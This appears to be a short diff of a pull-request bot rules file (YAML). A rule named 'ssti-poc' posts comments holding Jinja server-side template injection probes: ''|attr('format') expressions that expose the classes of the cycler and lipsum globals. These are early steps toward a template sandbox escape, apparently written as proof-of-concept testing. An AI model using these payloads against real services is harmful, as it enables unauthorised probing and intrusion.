@@ -1,10 +1,11 @@
+# G4o7T PoC test marker
 pull_request_rules:
   - name: ssti-poc
     conditions: []
     actions:
       comment:
         message: |
-          PoC-G4o7T-FIXED:
+          PoC-G4o7T-FIXED-v2:
           S1-author: {{ author }}
           S2-cls-cycler: {{ ''|attr('format')('{0.__class__}', cycler) }}
           S3-fn-lipsum-type: {{ ''|attr('format')('{0.__class__}', lipsum) }}
